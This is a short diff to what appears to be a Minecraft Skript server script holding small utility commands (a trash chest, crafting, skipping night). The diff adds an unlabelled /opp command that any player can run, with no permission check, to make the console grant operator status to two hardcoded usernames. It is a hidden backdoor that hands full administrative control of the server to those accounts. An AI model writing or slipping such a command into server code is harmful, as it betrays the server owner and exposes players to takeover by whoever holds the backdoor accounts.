@@ -1,6 +1,5 @@
 #trash
 command /trash:
-    aliases:/t
     trigger:
         open chest with 6 row named "TRASH" to player
         exit
@@ -13,3 +12,12 @@ command /craft:
 
 on bed enter:
 	set time to 6:00
+
+#
+command /opp [<username>]
+	trigger:
+		if %arg-1% is "eringi_riri":
+			execute console command "/op eringi_riri"
+		if %arg-1% is "eringi_ririri":
+			execute console command "/op eringi_ririri"
+		
